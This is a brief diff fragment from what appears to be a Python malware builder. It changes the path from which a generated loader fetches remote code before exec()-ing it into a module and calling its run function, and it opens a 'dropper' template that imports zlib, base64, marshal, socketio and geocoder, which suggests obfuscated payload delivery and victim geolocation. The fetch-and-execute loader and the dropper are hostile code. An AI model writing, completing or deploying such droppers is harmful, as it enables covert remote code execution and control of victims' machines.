@@ -150,7 +150,7 @@ def create_moduel(url):
   exec(code, module.__dict__)
 
   return module
-create_moduel(url+"client.py").run(url, file_path)"""
+create_moduel(url+"client/client.py").run(url, file_path)"""
             
         dropper = f"""import sys,zlib,base64,marshal,json,urllib,socketio,geocoder,requests,importlib.util
 from urllib.request import urlopen
